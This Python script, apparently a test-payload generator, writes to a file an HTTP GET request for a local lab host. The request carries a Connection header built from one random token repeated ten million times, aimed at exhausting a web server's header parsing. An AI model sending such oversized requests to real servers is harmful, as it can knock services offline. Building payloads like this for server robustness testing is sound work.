import random
import string
import logging
import base64

N = 10000000


def random_string():
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(10))


def main():
    logging.info("Creating http request..")
    http_headers = "Host: 192.168.1.36\r\nAccept-Encoding: gzip, deflate\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36\r\nAccept: text/html, application/xhtml+xml, application/xml; q=0.9, image/avif, image/webp, image/apng, */*; q=0.8, application/signed-exchange; v=b3; q=0.9\r\n"
    f = open("request_hconn.txt", "w")
    f.write("GET / HTTP/1.1\r\n")
    f.write(http_headers)
    head = "Connection: "
    mystr = random_string()
    tail = mystr + ', '
    for i in range(N):
        tail += mystr
        if (i < N - 1):
            tail += ', '
    head += tail
    f.write(head)
    f.write("\r\n\r\n")
    f.close()


if __name__ == "__main__":
    main()
